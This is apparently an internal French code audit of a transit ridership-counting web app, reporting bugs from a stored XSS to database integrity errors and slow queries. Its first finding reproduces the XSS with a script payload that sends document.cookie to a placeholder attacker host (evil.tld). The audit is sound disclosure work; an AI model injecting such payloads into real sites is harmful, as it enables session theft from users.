# Audit externe du code, septembre 2026

Lecture du code par un regard extérieur, sans contexte d'écriture : on cherche
les erreurs, les cas qui perdent une donnée, et les endroits où la machine
refait un travail qu'elle a déjà fait.

Ce document ne corrige rien. Il décrit ce qui a été trouvé, avec la
reproduction. Les corrections sont dans des PR séparées, pour qu'on puisse
discuter du constat séparément de la remédiation.

**Périmètre :** `comptagefer/` (app.py, offer.py, timetable.py, rt.py,
publish.py, carte.py, page.py, offline.js), `tests/`, CI, Docker, compose.
7 255 lignes, 117 tests, suite verte au moment de l'audit.

---

## Critique

### 1. XSS persistant sur `/carte` — `carte.py:65`

`client_id` est le seul champ de `counted_features` qui n'est pas échappé. Il
est ensuite sérialisé par `json.dumps` dans un bloc `<script>`. Un `</script>`
dans la chaîne ferme la balise et tout ce qui suit est interprété comme du
JavaScript.

Reproduction :

```python
c.post("/api/sessions", json={
    "client_id": "</script><script>fetch('http://evil.tld?c='+document.cookie)</script>",
    "origin_stop_id": "SP:A1", "destination_stop_id": "SP:B1",
    "passengers": 3, "reliability": 80})
"client_id" in c.get("/carte").text   # True
```

La donnée vient du client, est persistée, et sert sur une page publique. Les
autres champs — `pseudo`, `origine`, `destination`, `stops` — sont bien échappés,
et c'est ce qui rend le trou visible : l'intention est là, l'exécution non.

### 2. Un « train signalé » fait perdre le comptage suivant — `app.py:538`

Le contrôle d'idempotence porte sur `client_id` seul :

```sql
SELECT client_id, kind FROM saisie WHERE client_id = ?
```

Si la ligne existe, `_save_saisie` renvoie `{"stored": false}` en 200, sans rien
écrire. Un `POST /api/missing` consomme le `client_id` de l'onglet ; le
comptage réel qui suit, avec le même `client_id`, est silencieusement ignoré. Le
front affiche « C'est noté ». Le voyageur croit avoir compté.

Reproduction : deux POST successifs avec le même `client_id`, le premier en
`missing`, le second en `count`. Le second renvoie `stored: false` et
`/api/sessions` ne contient qu'une ligne.

Deux voies de correction, non exclusives : ne rejeter le doublon qu'à `kind`
égal, et régénérer le `client_id` après un `missing` (le front ne le fait pas
aujourd'hui).

### 3. `store_siri` lève sur un SIRI légitime — `rt.py:269`

`stop_update` a pour clé primaire `(trip_id, fetched_at, stop_id)`. Le chemin
GTFS-RT déduplique les `stop_id` répétés (`rt.py:116-119`), SIRI non. Deux
`EstimatedCall` portant le même `StopPointRef` — ce que la spec autorise —
provoquent une `IntegrityError` qui remonte de `poll_once` et **casse le cycle
entier** : plus d'alertes stockées, plus de purge.

Reproduction : un `EstimatedVehicleJourney` avec deux `EstimatedCall` sur `S1`
→ `IntegrityError: UNIQUE constraint failed: stop_update.trip_id, stop_update.fetched_at, stop_update.stop_id`.

### 4. `store_trip_updates` lève si deux entities partagent un `trip_id` — `rt.py:123`

Même clé primaire, mais ici la collision survient sur `trip_update` quand les
deux entities du même feed portent le même `trip_id` avec des arrêts différents.
Rien ne déduplique au niveau du `trip_id` : la dédup existante ne porte que sur
les `stop_id` à l'intérieur d'une entity.

Reproduction : un feed avec `("T1", ["S1"])` puis `("T1", ["S1","S2"])` →
`IntegrityError: UNIQUE constraint failed: trip_update.trip_id, trip_update.fetched_at`.

## Haute

### 5. SIRI est retesté à chaque cycle — `rt.py:289`

La méthode de l'outil dit « SIRI ET Lite est tenté une fois ». Le code fait :

```python
if stored == 0:
    store_siri(database, fetch_siri(), now)
```

Sans état, sur un flux GTFS-RT vide ou cassé, c'est un téléchargement XML toutes
les 120 secondes, indefini. Il faut une marque du type « SIRI a été tenté pour
ce créneau ».

### 6. SIRI et les alerts empilent les lignes

`_refresh_if_unchanged` (`rt.py:58`) rafraîchit la ligne existante quand rien
n'a changé. Seuls les trips en bénéficient. Mesuré sur 10 tours :

- `store_service_alerts` avec 50 alertes → 500 lignes, 50 `alert_id` distincts
- `store_siri` avec 1 journey → 10 lignes `trip_update`, 10 `stop_update`

La purge borne à 6 h, ce qui reste 180 fois le nombre d'entités par jour. Sur un
conteneur de production dont la taille de base est surveillée, c'est du bruit.

### 7. `/api/trips` renvoie 500 sur un `at` malformé — `app.py:129`

```python
parsed = datetime.fromisoformat(at.replace("Z", "+00:00"))
```

`ValueError` non rattrapée. Confirmé : `?at=pas-une-date` produit une traceback
Python complète. Un paramètre client ne devrait pas produire un 500 avec un
traceback ; `HTTPException(422)` est la réponse juste.

### 8. `nearest_stops` classe en degrés au carré — `offer.py:80`

```python
ranked = sorted(rows, key=lambda row: (row[2] - lat) ** 2 + (row[3] - lon) ** 2)
```

Un degré de longitude vaut `cos(lat)` fois un degré de latitude : à 48° N, un
facteur 0,67. `_distance_m` (`offer.py:24`) applique la correction et sert partout
ailleurs dans le module — la incohérence est interne.

Mesure : sur un jeu de 19 gares françaises réelles, l'ordre des trois plus
proches diffère pour **61 % des positions testées** (20 000 tirages aléatoires
dans la bounding box Île-de-France). Exemple à 49.172 / 1.245 : le code propose
Dreux, la géométrie propose Mantes-la-Jolie.

## Moyenne

### 9. `total` et `features` divergent sur `/carte` — `app.py:172` contre `carte.py:55`

`carte()` passe au pied de page le compte des `kind` dans `{count, serpent}`,
alors que `counted_features` dessine aussi les `missing`. Confirmé : une seule
saisie `missing` avec coordonnées donne « 0 comptage au total, 1 sur la carte ».
La page se contredit.

### 10. Aucun index sur `stop.parent`

`stop` ne porte que l'autoindex de la clé primaire. Mesures sur une base
synthétique de 36 000 arrêts (ordre de grandeur du GTFS national) :

| Opération | Temps | Cause |
|---|---|---|
| `search_stops` | 94 ms | N+1 : 32 `COUNT(*)` en full scan, plus un `LIKE '%…%'` |
| `_stop_family` | 6 ms par appel | `stop_id IN (…) OR parent IN (…)` — l'`OR` empêche l'usage d'index |
| `_coordinates` (carte) | 88 ms | charge toute la table à chaque requête |
| `_station_names` (ligne, serpent) | 70 ms | idem |

`_stop_family` est appelé trois fois par `listed_trips`. Les deux dernières
charges peuvent être mises en cache ; le N+1 se résout par un
`CREATE INDEX stop_parent ON stop(parent)`, mais un index seul ne dispense pas
de remplacer la boucle par une requête groupée.

### 11. `admin_sessions` grossit sans borne — `app.py:63`

```python
admin_sessions: set[str] = set()
```

Jamais purgé, cookie sans `max_age`. Chaque connexion admin ajoute une entrée
qui vit jusqu'à l'arrêt du processus, et une session reste valable tout ce
temps. Il faut une expiration.

## Basse

- **Code mort.** `ensure_stop_names` (`app.py:395`) et `line_counts`
  (`timetable.py:301`) ne sont appelés d nulle part. `import logging` est fait
  dans la boucle de `_poll_forever` (`app.py:322, 334`) au lieu du sommet de
  module.
- **Ruff : 22 avertissements**, non bloquants en CI. Deux méritent un fix
  immédiat : `sous_titre` calculé puis jamais utilisé (`app.py:759`) et
  `_has_lines` importé pour rien (`app.py:861`).
- **`/carte` n'a pas de borne sur `features`.** Le JSON est sérialisé dans la
  page, donc la taille de la page croît avec la base. Le pied annonce le nombre,
  ce qui n'est pas une limite.

## Ce qui est solide

Ces points sont le contexte dans lequel lire le reste : les défauts ci-dessus
sont des trous isolés dans un code par ailleurs tenu.

- 117 tests passent, dont des tests navigateur dans un vrai Chromium, ce qui est
  rare et ce qui explique qu'une régression d'affichage JavaScript soit
  attrapée.
- Le dédup GTFS-RT, la rétention à 6 h, le rafraîchissement en place des trips
  non modifiés : la gestion du cache temps réel est la partie la mieux pensée
  du projet.
- L'import du timetable est atomique (`.importing` puis `replace`), donc une
  importation interrompue ne laisse pas de base à moitié écrite.
- Le multipart de la publication est écrit à la main, avec un séparateur tiré au
  hasard et un test de « fichier vide » qui regarde la structure du CSV plutôt
  que de compter les virgules.
- Publication et téléchargement partagent `render_csv` : il n'y a pas deux
  définitions du CSV qui peuvent diverger.
- Le front fonctionne hors ligne avec une file d'attente et la reprise d'un
  serpent à moitié saisi, et le test `offline.test.js` couvre la logique pure.

## Limites de cet audit

- Lecture statique et exécution de reproductions ciblées. Pas de test de charge,
  pas d'audit de sécurité au sens penetration test, pas de revue des
  performances sur le Pi de production.
- Les temps mesurés le sont sur une base synthétique, pas sur le GTFS national
  réel. L'ordre de grandeur est juste, la valeur exacte ne l'est pas.
- Le JavaScript de `page.py` n'a été relu qu'à la lecture, sauf pour la
  reproduction du point 1.
